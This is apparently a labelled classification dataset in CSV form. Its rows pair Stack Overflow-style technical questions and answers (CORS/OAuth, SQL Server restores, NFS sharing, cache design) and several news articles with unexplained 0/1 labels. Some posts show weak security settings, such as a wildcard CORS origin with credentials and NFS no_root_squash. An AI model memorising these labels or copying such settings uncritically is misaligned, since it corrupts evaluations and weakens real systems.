A,C
"<p>I am trying to add OAuth 2.0 in spring mvc app. User should be authenticated in order to get a api call. I have set a headers in spring mvc controller as:</p>

<pre><code>@RequestMapping(value = ""/admin-api/get-all-order"", method = RequestMethod.GET)
    public ResponseEntity getAllOrders(@RequestHeader(""Authorization"") String bearerToken) {
        try {
            List&lt;OrderModel&gt; order = orderService.getAllOrders();
            return new ResponseEntity(order, HttpStatus.OK);
        } catch (HibernateException e) {
            return new ResponseEntity(e.getMessage(), HttpStatus.BAD_REQUEST);
        }
    }
</code></pre>

<p>For requesting api I have used angular 5. I make a api call in angular like:</p>

<pre><code>return this.http.get&lt;T&gt;(this.getAllOrderUrl, {
            headers: {
                ""Authorization"": ""bearer "" + JSON.parse(localStorage.getItem(""token""))[""value""],
                ""Content-type"": ""application/json""
            }
        }).catch(error =&gt; {
            return this.auth.handleError(error);
        })
</code></pre>

<p>But it gave me a strange error.
<a href=""https://i.stack.imgur.com/gFWEs.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/gFWEs.png"" alt=""enter image description here""></a></p>

<p>I have already enabled a CORS for 'localhost:4200'. CORS filtering works fine on other request.</p>

<pre><code>@Override
    public void doFilter(ServletRequest req, ServletResponse res, FilterChain chain)
            throws IOException, ServletException {
        HttpServletResponse response = (HttpServletResponse) res;
        HttpServletRequest request = (HttpServletRequest) req;
        response.setHeader(""Access-Control-Allow-Origin"", ""*"");
        response.setHeader(""Access-Control-Allow-Credentials"", ""true"");
        response.setHeader(""Access-Control-Allow-Methods"",
                ""ACL, CANCELUPLOAD, CHECKIN, CHECKOUT, COPY, DELETE, GET, HEAD, LOCK, MKCALENDAR, MKCOL, MOVE, OPTIONS, POST, PROPFIND, PROPPATCH, PUT, REPORT, SEARCH, UNCHECKOUT, UNLOCK, UPDATE, VERSION-CONTROL"");
        response.setHeader(""Access-Control-Max-Age"", ""3600"");
        response.setHeader(""Access-Control-Allow-Headers"",
                ""X-PINGOTHER,Content-Type,X-Requested-With,Accept,Origin,Access-Control-Request-Method,Access-Control-Request-Headers,Authorization,Key"");

        if (""OPTIONS"".equalsIgnoreCase(request.getMethod())) {
            response.setStatus(HttpServletResponse.SC_OK);
        } else {
            chain.doFilter(req, res);
        }
    }
</code></pre>

<p>If I tried in postman it give me a desired result.
<a href=""https://i.stack.imgur.com/1729D.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/1729D.png"" alt=""enter image description here""></a></p>

<p><strong>Response Header</strong>
<a href=""https://i.stack.imgur.com/iWZ4S.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/iWZ4S.png"" alt=""enter image description here""></a></p>

<p>What am I doing wrong? Please help me out. Hoping for positive response thanks!</p>
",1
"Young people were singled out as increasingly likely victims of internet-borne fraud, including because of their penchant for liberal sharing of personal information.

A total of 27% of Brits of all ages – including over 52% of youths aged 18-25 – reuse their email password for a number of other online accounts, according to a study conducted by the United Kingdom government’s ‘Cyber Aware’ campaign together with Experian.

On the other hand, only 13% of people aged 55 or older were found to be guilty of such password reuse. Of course this might be best explained by the fact that younger people tend to set up more online accounts than their parents or grandparents.

Meanwhile, about 79% of over 2,100 respondents across the generations admitted that they had sent sensitive information such as bank details or copies of passports and driving licenses via email. Two out of three have yet to delete all such information from their inboxes. For one in every two respondents, the bank or credit card information that they have previously sent by email is still sitting among their sent items.

The conclusions of the ‘Cyber Aware’ survey come in the wake of recent findings that online fraud is the most prevalent crime in England and Wales, costing individuals some £10 billion last year alone. Young people were singled out as increasingly likely victims of internet-borne fraud, including because of their penchant for liberal sharing of personal information.

Also, research by Experian last year concluded that older Brits value security over convenience. Thanks to their tendency to use various passwords for different online services, they were found to be generally more prudent in protecting their online lives than their grandchildren.

Young Brits are by no means an outlier as far as poor password habits go. For example, a 2016 survey by the US-based Pew Research Center found that 39% of those quizzed used the same or very similar passwords for many of their online accounts, thus putting themselves at risk of identity theft or fraud.

Want my password? But of course!

Sharing passwords with other people is another common way of courting trouble. For instance, more than four in ten Americans have shared the password to one of their online accounts with a friend or family member, according to the Pew Research Center study.

A LastPass poll in the United States in 2016 found a similar proportion of people sharing not only their passwords to email and communication services, but also passwords for financial services – despite most of them acknowledging that such practice is risky. Only 19% of the respondents claimed that they do not share with other people any login details that would jeopardize their identity or financial information. In general, the younger the people the more likely they were to share their passwords.

Back in the UK recently, several Members of Parliament found nothing strange about sharing their work computer login details with aides and interns, earning a rebuke from the country’s data protection watchdog ICO.",1
"<p>I am attempting to automate restoring .bak files on a secondary database in the case of a primary server failure.  Both servers are SQL server 2014.</p>

<p>Here is a sample SQL script:</p>

<pre><code>USE master
GO

DECLARE @DBName varchar(50)
DECLARE @BackupFile varchar(256)

Set @DBName = 'test-db'
Set @BackupFile = 'D:\MSSQL\Backups\test-db\test-db_backup_2016_03_18_001622_2611392.bak'



-- Find Logical and Physical file names
declare @LogicalDataFile      sysname
        , @LogicalLogFile       sysname
        , @PhysicalDataFile     nvarchar(260)
        , @PhysicalLogFile      nvarchar(260)

-- Data file
select  @LogicalDataFile = name
        , @PhysicalDataFile = physical_name
from    sys.master_files
where   database_id = db_id(@DBName)
        and type_desc = 'ROWS'

-- Log file
select  @LogicalLogFile = name
        , @PhysicalLogFile = physical_name
from    sys.master_files
where   database_id = db_id(@DBName)
        and type_desc = 'LOG'


-- Print variables
Print 'Logical Data File: ' + @LogicalDataFile 
Print 'Logical Log File: ' + @LogicalLogFile
Print 'Physical Data File: ' + @PhysicalDataFile
Print 'Physical Log File: ' + @PhysicalLogFile


-- Set as single user mode
EXEC('ALTER DATABASE [' + @DBName
+ '] SET SINGLE_USER
WITH ROLLBACK IMMEDIATE')


--DB that will be over written
RESTORE DATABASE [@DBName] 
--Restore file with data
FROM DISK = @BackupFile
WITH MOVE @LogicalDataFile TO @PhysicalDataFile,
MOVE @LogicalLogFile TO @PhysicalLogFile,
REPLACE,
STATS=10

-- Return to multi-user mode
EXEC('ALTER DATABASE [' + @DBName 
+ '] SET MULTI_USER')
</code></pre>

<p>When I run the above script I get the following output:</p>

<pre><code>Logical Data File: test-db
Logical Log File: test-db_log
Physical Data File: D:\MSSQL\Data\test-db.mdf
Physical Log File: D:\MSSQL\Data\test-db_log.ldf
Msg 1834, Level 16, State 1, Line 50
The file 'D:\MSSQL\Data\test-db.mdf' cannot be overwritten.  It is being used by database 'test-db'.
Msg 3156, Level 16, State 4, Line 50
File 'test-db' cannot be restored to 'D:\MSSQL\Data\test-db.mdf'. Use WITH MOVE to identify a valid location for the file.
Msg 1834, Level 16, State 1, Line 50
The file 'D:\MSSQL\Data\test-db_log.ldf' cannot be overwritten.  It is being used by database 'test-db'.
Msg 3156, Level 16, State 4, Line 50
File 'test-db_log' cannot be restored to 'D:\MSSQL\Data\test-db_log.ldf'. Use WITH MOVE to identify a valid location for the file.
Msg 3119, Level 16, State 1, Line 50
Problems were identified while planning for the RESTORE statement. Previous messages provide details.
Msg 3013, Level 16, State 1, Line 50
RESTORE DATABASE is terminating abnormally.
</code></pre>

<p>I wanted to make sure that the MOVE statements weren't being ignored for some reason, so I changed the variable names for the logical and physical file names - as expected, I got an error stating that the variables must be declared.</p>

<p>Is there something else that needs to be done to allow the database to be overwritten?  There are no other connections to this database.</p>
",0
"<p>There are several ways in which this bug could be fixed:</p>



<ol>
<li><p>One solution, for modern browsers, would be to add the <code>u</code> flag to the regexp to make it treat surrogate pairs as single characters, but alas, <a href=""https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp#Browser_compatibility"" rel=""nofollow noreferrer"">browser support for that ES2015 feature</a> may still be insufficient.</p></li>
<li><p>An alternative fix would be to make the regexp explicitly match surrogate pairs, like this:</p>

<pre class=""lang-js prettyprint-override""><code>link = link.replace(/%(?:[\da-fA-F]{2})|[\uD800-\uDBFF][\uDC00-\uDFFF]|[^\w\d-./[\]]/g, function (match) {
</code></pre>

<p>Note that the <code>\?|\+</code> part of the original regexp is redundant, so I've omitted it above.  The surrogate pair pattern must come <em>before</em> the <code>[^\w\d-./[\]]</code> part, so that the regexp engine tries it first.  Alternatively, individual surrogate characters could be completely excluded from the match by changing the last part into <code>[^\w\d\-./[\]\uD800-\uDFFF]</code>.</p></li>
<li><p>An even simpler fix (which would likely also speed up the replacement a little) would be to allow the regexp to match an arbitrary number of non-excluded code units at once, like this:</p>

<pre class=""lang-js prettyprint-override""><code>link = link.replace(/%(?:[\da-fA-F]{2})|[?+]|[^\w\d-./[\]%?+]+/g, function (match) {
</code></pre>

<p>Note that this solution requires explicitly excluding the special characters <code>%</code>, <code>?</code> and <code>+</code> from the last part of the regexp, since the callback code below assumes that those characters will always be matched individually.</p></li>
</ol>

<p>Any of these methods should solve the problem (although, as noted, the first one might not work on all supported browsers yet).  Personally, I'd recommend the last method for its simplicity and efficiency, although it probably needs to be explicitly commented so that future maintainers won't accidentally break it e.g. by removing the <code>+</code>.</p>

<hr>

<p>Ps. My <a href=""https://stackapps.com/questions/4486/the-stack-overflow-unofficial-patch-soup"">SOUP</a> user script currently fixes this issue as a side effect of its workaround for the <a href=""https://meta.stackexchange.com/q/234680"">IDN percent-encoding bug</a>.  The code I'm using in that work-around is basically the same as my third suggestion above, except somewhat simplified (since it's just a pre-processing step before the URL is fed into the actual SE <code>properlyEncoded()</code> function):</p>

<pre class=""lang-js prettyprint-override""><code>// Separate URL and optional title, fix possibly broken % encoding in URL
var m = /^\s*(.*?)(?:\s+""(.*)"")?\s*$/.exec(text);
var url = m[1], title = m[2];
var normalized = url.replace(/%(?:[\da-fA-F]{2})|[^\w\d\-./[\]%?+]+/g, function (match) {
    if (match.length === 3 &amp;&amp; match.charAt(0) == ""%"") return match;
    else return encodeURI(match);
} );
</code></pre>
",0
"<p>As mentioned in my other post, I am attempting to learn from Gross'""<em>Relativistic quantum mechanics and field theory</em>"", and I have a question concerning the manipulation of the antisymmetric 4x4 tensors involved.</p>

<p>There are two points where this does not make sense to me. Firstly, when proving that the correct equations of motion can be derived from the EM Lagrangian density:</p>

<p>$$
    L = -\frac{1}{4} F_{\mu \nu}F^{\mu \nu}-j_\mu A^{\mu}
$$</p>

<p>Gross mentions that the equation can be simplified by expanding it the following way:</p>

<p>$$
    -\frac{1}{4} F_{\mu \nu}F^{\mu \nu} = -\frac{1}{4} (\partial_\mu A_\nu -\partial_\nu A_\mu)(\partial^\mu A^\nu -\partial^\nu A^\mu)
$$
$$
   =-\frac{1}{2} g^{\mu \mu'}g^{\nu \nu'}(\partial_\mu A_\nu\partial_{\mu'} A_{\nu'} -\partial_\mu A_\nu\partial_{\nu'} A_{\mu'})
$$</p>

<p>We then construct the Lagrangian equations of motion, which doesn't bother me. My question is (hopefully) much simpler. No matter how I treat the product shown above I cannot remove the multiple of 2. What 4-vector or metric tensor trickery is happening here? </p>

<p>The best I can do is to operate on all of the contravariant partials and A's with the metric tensor and get the following for the expansion:
$$
    -\frac{1}{4} (\partial_\mu A_\nu -\partial_\nu A_\mu)(\partial^\mu A^\nu -\partial^\nu A^\mu)
$$
$$
   = -\frac{1}{4} g^{\mu \mu'}g^{\nu \nu'}(\partial_\mu A_\nu\partial_{\mu'} A_{\nu'} -\partial_\mu A_\nu\partial_{\nu'} A_{\mu'}-\partial_\nu A_\mu\partial_{\mu'} A_{\nu'}+\partial_\nu A_\mu\partial_{\nu'} A_{\mu'})
$$</p>

<p>I understand from here the argument of cancelling the factor of 2 is as simple as grouping these terms into two distinct factions, but I don't see how one can do so? </p>

<p>I can sort of see how, if $\mu = \mu'$ and $ \nu = \nu'$ how the middle two terms could be reshuffled, ie:
$$
   = -\frac{1}{4} g^{\mu \mu'}g^{\nu \nu'}(\partial_\mu A_\nu\partial_{\mu'} A_{\nu'} -2\partial_\mu A_\nu\partial_{\nu'} A_{\mu'}+\partial_\nu A_\mu\partial_{\nu'} A_{\mu'})
$$</p>

<p>But even if I allow for that, the partials for the last two terms are completely different.</p>

<p>I expect that my misunderstanding here stems from being unfamiliar with 4-vectors. My background is Chemistry and I am just trying to understand some of these deeper concepts.</p>

<p>A similar occurrence happens two pages later, where Gross states that in making the relativistic lagrangian density, we can separate out the scalar potential terms (the time terms in the A 4-vector), by doing:</p>

<p>$$
  L = -\frac{1}{4} F_{\mu \nu}F^{\mu \nu}-j_\mu A^{\mu}
$$ 
$$
  = -\frac{1}{2} \partial_\mu A^0(\partial^\mu A^0 -\partial^0 A^\mu)+\frac{1}{2} \partial_\mu A^i(\partial^\mu A^i -\bigtriangledown_i A^\mu) - \rho A^0 + j \cdot A
$$
Where $\rho$ and $A^0$ are the time terms for the j and A 4-vectors, respectively.</p>

<p>Similarly, I don't know how the $-\frac{1}{4}$ term can be broken up here either. I know that this is something dead simple, but I'm stuck and I'd appreciate any help. </p>
",0
"<p>I claim there is no true, objective difference between a property and a definition. Part of creating mathematics is deciding what are properties that need to be proven from definitions versus what are instead <em>defining</em> properties. Often there are <em>morally correct</em> definitions: those that get the greatest traction in the begining, or the greatest mileage in the end, or are the most aesthetically elegant, or are the most suggestive and illuminating as to their purpose and discovery, or mimic our intuition closest, or have other desirable properties. I am a moral relativist, though, believing that which definition of something is best (even ""morally correct"") can depend on context.</p>

<p>On the one hand, it would be nice if every concept had a single definition, and every other property was derivative - this would make learning much more straightforward. But when there is no universally best definition (just look up ""Prufer domain""), it is a disservice to other definitions to pick just one for everybody; furthermore, the ability to convert between definitions is indicative of a fuller understanding of all of the properties related to a given concept. Indeed, being able to think about a concept from multiple points of view is extremely useful in practice - then <em>all</em> of the basic properties feel ""defining"" and are more memorable. Showing that different definitions are equivalent, and then being able to feel that their equivalence is ""obvious,"" is a rite of passage.</p>

<p>Thus I am forced to reject the premise of this question. Being exposed to multiple definitions of things is good for learning math, and having multiple definitions is healthy for the whole enterprise of doing math. In any case, no book of definitions can change the fact that multiple definitions exist out there in the world and are in wide usage by different people and sources.</p>

<p>You might, though, find some definitions hard to understand, or hard to see the motivation of, or hard to see how to use, at least at first. To this end I can recommend <em>shopping</em>: shop for the ""right"" definitions of concepts for <em>you</em>, the ones that are the most accessible or intuitive. I do this all the time, which is why I am rarely satisfied with reading just one source (I go shopping for more than just definitions, though). Your preferences may differ from that of others, but a good heuristic is that the more basic or introductory texts will have definitions that are easier to get a foothold with, and you want to learn these first.</p>

<p>For abstract algebra, the text I used in my educational track was Gallian's <em>Contemporary Abstract Algebra</em>, covering groups, rings and fields, which was chosen for simplicity. I don't think it covers algebras (the ones over scalars) or free groups. There are a number of good sources online that can be found through googling, though. The shopping you'll have to do on your own, or ask as a separate question (although asking for introductory texts has been done enough times on MSE).</p>
",0
"<p>Use NFS to share file between systems if there is no windows involved, it is so easy.</p>

<p>Install <a href=""https://apps.ubuntu.com/cat/applications/nfs-kernel-server"" rel=""noreferrer"">nfs-kernel-server <img src=""https://hostmar.co/software-small"" alt=""Install nfs-kernel-server""></a> and <a href=""https://apps.ubuntu.com/cat/applications/nfs-common"" rel=""noreferrer"">nfs-common <img src=""https://hostmar.co/software-small"" alt=""Install nfs-common""></a> on the computer that has the files to be shared. These can be installed in the Software Center, or however you prefer to install packages. You can install them on the command-line with:</p>

<pre><code>sudo apt-get update &amp;&amp; sudo apt-get install nfs-kernel-server nfs-common
</code></pre>

<p>You need to edit the exports file that shows what to share and with whom. So run:</p>

<pre><code>gksu gedit /etc/exports
</code></pre>

<p>For example, to give full read and write permissions, allowing any computer from 192.168.1.1 through 192.168.1.255, add this line to <code>/etc/exports</code>:</p>

<pre><code>/directory_to_share 192.168.1.1/24(rw,no_root_squash,async)
</code></pre>

<p>My daughter's export file looks like this (I am <code>.201</code>--we are not using a range, just one IP):</p>

<pre><code>/home           192.168.0.201(rw,sync,no_root_squash,no_subtree_check)
/srv/nfs        192.168.0.201(rw,sync,no_subtree_check)
</code></pre>

<p>Restart the NFS server by running:</p>

<pre><code>sudo /etc/init.d/nfs-kernel-server restart
</code></pre>

<p>(Or just reboot the computer.)</p>

<p>From now on after editing the <code>/etc/exports</code> file, you can just run <code>sudo exportfs -a</code> to apply the changes.</p>

<p>The <a href=""http://manpages.ubuntu.com/manpages/precise/en/man8/showmount.8.html"" rel=""noreferrer""><code>showmount</code></a> cmommand will tell you that all went well--for example, on my daughter's computer, it shows she will share these two things with my computer @ .201 (me) if requested</p>

<pre><code>$ showmount -e
Export list for jamie-desktop:
/srv/nfs 192.168.0.201
/home    192.168.0.201
</code></pre>

<p>Then install <a href=""https://apps.ubuntu.com/cat/applications/nfs-common"" rel=""noreferrer"">nfs-common <img src=""https://hostmar.co/software-small"" alt=""Install nfs-common""></a> on the computer that wants to mount the export shares as part of its file system. </p>

<p>An <a href=""http://manpages.ubuntu.com/manpages/precise/en/man5/fstab.5.html"" rel=""noreferrer""><code>fstab</code></a> entry must be added to have your computers nfs-client mount another computers exports @ boot time. <code>gksu gedit /etc/fstab</code> will edit the required file.</p>

<pre><code> 192.168.0.200:/srv/nfs  /media  nfs  rsize=8192 and wsize=8192,noexec,nosuid
</code></pre>

<p>Reboot and the share is mounted in <code>/media</code>.</p>

<p>Set up a server on the client and client on the server for two-way shares.</p>

<p>You can print to a shared printer with CUPS (as mentioned in <a href=""https://askubuntu.com/a/8540/22949"">this answer</a>).</p>
",0
" (CNN) Publix and Chocolate Shoppe Ice Cream Co. have joined the growing list of recalls linked to Aspen Hills Inc. cookie dough.  Publix issued a recall this week of its chocolate chip cookie dough ice cream sold at stores in Florida, Georgia, Alabama, Tennessee and North and South Carolina. The packages have a sell by date of May 27, 2017, and the UPC code   .  Similarly, Chocolate Shoppe Ice Cream Co. Inc. announced the recall of more than 4, 000 gallon cartons, more than 5, 000 pints and some   cartons of its cookie dough, Heaps of Love, peanut butter cookie dough, Sticks  Stones and Yippee Skippee flavors. It is also recalling   cartons of its Baked Bear cookie dough ice cream.  The products contain cookie dough supplied by Aspen Hills, which first announced last month that its   chocolate chip cookie dough might be contaminated with listeria. This prompted Blue Bell Ice cream to issue a recall, which it expanded this week.  Since then, Blue Bunny issued its own recall of Hoppin’ Holidoodle for the same reason. All of the companies have stated that no consumers have fallen ill. These products were distributed in a number of states, all of which are listed on the FDA website. ”We are acting out of an abundance of caution because a thorough review of our manufacturing environment has revealed instances where we may not have met our food safety standards,” said Jon Austin, a spokesman for Aspen Hills. ”Our lab results for all of our products are negative.” The same concern reached to an energy bar, as well. On Tuesday, Nutrisystem voluntarily recalled its Nutricrush Chocolate Chip Cookie Dough bar based on listeria concerns raised by an unnamed vendor supplying its chocolate chip cookie dough. The product had been distributed to ShopRite and Hannaford stores in Connecticut, Delaware, Massachusetts, Maryland, Maine, New Hampshire, New Jersey, New York, Pennsylvania, Rhode Island, Virginia and Vermont and online through Amazon. com and Walmart. com. Again, no illnesses have been reported. The list of recalled products may continue to grow as companies discover additional products that contain Aspen Hill cookie dough. Listeria monocytogenes may cause serious and even fatal infections, according to the Centers for Disease Control and Prevention: about 1, 600 illnesses and 260 deaths are caused by listeria annually in the United States. Otherwise healthy individuals may suffer only   symptoms, such as high fever, severe headache, stiffness, nausea, abdominal pain and diarrhea. However, a listeria infection can cause miscarriages and stillbirths among pregnant women and may become serious for young children, frail or elderly people, and others with weakened immune systems.  Last week, Nestle USA Inc. issued an unrelated recall of its Drumstick Club 16 count variety pack and 24 count vanilla pack after receiving positive test results for listeria from equipment involved in the production of these ice cream novelties. The products have been distributed nationally, but no illnesses have been reported, the company said.",0
"SiriusXM hosts Stephen K. Bannon and David Webb announced on Breitbart News Daily that SiriusXM has suspended Glenn Beck and Webb will temporarily take over Beck’s 9AM to noon Eastern time slot on SiriusXM’s Patriot Channel 125. [SiriusXM issued the following statement:  SiriusXM encourages a diversity of discourse and opinion on our talk programs. However, comments recently made by a guest on the independently produced Glenn Beck Program, in our judgement, may be reasonably construed by some to have been advocating harm against an individual currently running for office, which we cannot and will not condone. For that reason, we have suspended The Glenn Beck Program from our Patriot channel for the coming week and are evaluating its place in our lineup going forward. SiriusXM is committed to a spirited, robust, yet responsible political conversation and believes this action reflects those values. The suspension is in response to the interview Beck did with fiction author Brad Thor last Wednesday, in which Thor likened the GOP’s presumptive nominee Donald Trump to a South   dictator who would cause an “  event” for the country if elected. Thor then declared that in such a case, Congress would not be able to remove Trump from office by “legal means” through impeachment, so Thor asked “what patriot will step up and do that” if Trump oversteps his Constitutional restraints. Beck agreed with Thor’s assessment. Here is the exchange: THOR: He is a danger to America and I got to ask you a question and this is serious and this could ring down incredible heat on me because I’m about to suggest something very bad. It is a hypothetical I am going to ask as a thriller writer. With the feckless, spineless Congress we have, who will stand in the way of Donald Trump overstepping his constitutional authority as President? If Congress won’t remove him from office, what patriot will step up and do that if, if, he oversteps his mandate as president, his   authority, I should say, as president. If he oversteps that, how do we get him out of office? And I don’t think there is a legal means available. I think it will be a terrible, terrible position the American people will be in to get Trump out of office because you won’t be able to do it through Congress. BECK: I would agree with you on that and I don’t think you actually have the voices we’ve been talking about and we’ve been talking about this   for a while. I think the voices like ours go away. I don’t think we are allowed  —   especially if things, and I believe the economy is going to go to crap, even if Jesus was in office. It’s going to naturally reset. It has to. Read the rest of the exchange here. After receiving criticism for these comments from people who believed Thor and Beck were suggesting or at least implying assassination, Beck offered a lengthy defense of his statements. You can read the full transcript of his defense here. Listen to Bannon and Webb’s announcement of the suspension below: Breitbart News Daily airs on SiriusXM Patriot 125 weekdays from 6AM to 9AM Eastern.",0
"<p>Yes there will be a (marginal) impact on performance, but if it's for debugging purposes I don't think you'll be able to tell the difference.</p>

<p>You can easily test this yourself on your data by adding statistics IO and looking at the query plans</p>

<p>Take this code for example:</p>

<pre><code>SET STATISTICS time ON;
SET STATISTICS IO ON;

WITH randowvalues
    AS(
       SELECT 1 id, CAST(RAND(CHECKSUM(NEWID()))*100 AS int) randomnumber
        UNION  ALL
        SELECT id + 1, CAST(RAND(CHECKSUM(NEWID()))*100 AS int)  randomnumber
        FROM randowvalues
        WHERE 
          id &lt; 1000
      )



SELECT *
INTO sample 
FROM randowvalues
OPTION(MAXRECURSION 0)

GO

DECLARE @VAR AS INT

SET @VAR = 500    

SELECT * FROM sample WHERE ID &gt; @VAR

CREATE TABLE #cut ( ID int )

INSERT INTO #cut VALUES (500)

SELECT * FROM sample A INNER JOIN #CUT B ON A.ID &gt; B.ID
</code></pre>

<p>You will notice that in the <a href=""https://www.brentozar.com/pastetheplan/?id=rksJbnfUm"" rel=""nofollow noreferrer"">execution plan</a> that the first query does a simple table scan for an estimated cost of 0.005.</p>

<p>For the second construction you'll see that the plan for the insert has an estimated cost of around 0.01, and the query itself added an extra table scan (for your temporary table) and a nested loops join to combine data from both tables.<br>
The estimated cost for this select is also around 0.01.</p>

<p>The output for the IO statistics for the first select is: </p>

<blockquote>
  <p>Table 'sample'. Scan count 1, logical reads 3, physical reads 0,
  read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob
  read-ahead reads 0.</p>
</blockquote>

<p>So this query does 3 reads.</p>

<p>The output for the insert and the select with the join is this:</p>

<blockquote>
  <p>Table '#cut'. Scan count 0, logical reads 1, physical reads 0,
  read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob
  read-ahead reads 0.  </p>
  
  <p>Table 'sample'. Scan count 1, logical reads 3, physical reads 0,
  read-ahead reads 0, lob logical reads 0, lob physical reads 0, lob
  read-ahead reads 0. Table '#cut'. Scan count 1, logical reads 1,
  physical reads 0, read-ahead reads 0, lob logical reads 0, lob
  physical reads 0, lob read-ahead reads 0.</p>
</blockquote>

<p>So if you add that up the second construct with the join does a bit more IO.</p>

<p>Creating a clustered index on the ID column replaces the table scan with a clustered index seek as can be seen in <a href=""https://www.brentozar.com/pastetheplan/?id=Hk0VZ2GIQ"" rel=""nofollow noreferrer"">this plan</a> or creating a nonclustered index on ID results in <a href=""https://www.brentozar.com/pastetheplan/?id=S1AiZ2MLQ"" rel=""nofollow noreferrer"">this plan</a>.</p>

<p>Even though the impact in your situation can vary depending on your actual data and table structure, your construction with a temporary table will always add <em>some</em> IO, a second table access and a join operator which will impact performance negatively (maybe marginally).</p>
",0
"<p>Apparently the <a href=""http://en.wikipedia.org/wiki/ILLIAC_II"" rel=""nofollow"">ILLIAC II</a> had a single/unified cache (called a ""fast buffer"") and a primitive 3-stage pipeline. It looks like pretty much every (pipelined) processor thereafter had split (first level) caches, as long as it had caches. L2, L3+ caches are usually unified though.</p>

<p>There have also been some recent proposals for unified first level cache, e.g. from Intel Spain labs (which I didn't even know existed): ""<a href=""http://www.des.udc.es/~basilio/papers/Rolan13-VSC.pdf"" rel=""nofollow"">Virtually Split Cache: An Efficient Mechanism to Distribute Instructions and Data""</a> (TACO 2013). The main downside is complexity if you want to preserve good throughput. The reasons for the split L1 cache status quo are explained in the paper as:</p>

<blockquote>
  <p>While unified approaches usually provide higher hit rates by automatically sharing resources instead of statically partitioning them, split [L1] caches are the preferred configuration, mainly because of the following reasons:</p>
  
  <ul>
  <li><p>Different instructions can access the instruction cache, in the fetch stage of the
  pipeline, and the data cache, usually in the memory stage, at the same time in
  pipelined processors. Unified approaches would require several access ports and,
  thus, more complexity to provide the same advantages.</p></li>
  <li><p>The instruction cache design may be simpler, as it only needs to perform, ideally,
  read operations.</p></li>
  <li><p>Unified caches of the same aggregated capacity imply higher latencies.</p></li>
  </ul>
</blockquote>

<p>Their ""virtually split cache"" proposal is somewhere in between as the cache cells are unified but there are two sets of tags and indices and independent ports.</p>

<p>Also note that the dichotomy between Harvard and von Neumann is not that sharp in practice as most general purpose current processors (using a split L1 cache but unified lower levels of memory) are of the so-called <a href=""https://books.google.com/books?id=jKOsdJ8Rk6EC&amp;pg=PA5"" rel=""nofollow"">""modified Harvard architecture""</a>, which is a combination of the best of both worlds. As I said in a comment above, the terminology ""modified Harvard architecture"" is somewhat arbitrary given that it applies to a hybrid; you might as well decide to call it ""modified von Neumann architecture"", it's just that the former has been the established term of art. Furthermore, different authors may mean different things by ""modified Harvard architecture""; it could mean that the memory is unified and caches are [mostly] transparent so the memory as a whole appears to the programmer as in the von Neumann model, or it could also mean a weaker model in which there are different address spaces for data and programs but there are operations to copy between these; see slide 8 in <a href=""http://www.sonoma.edu/users/f/farahman/sonoma/courses/es310/lectures/chapter2_.pdf"" rel=""nofollow"">this presentation</a>, which is one of the comprehensive ones on this topic.</p>
",0
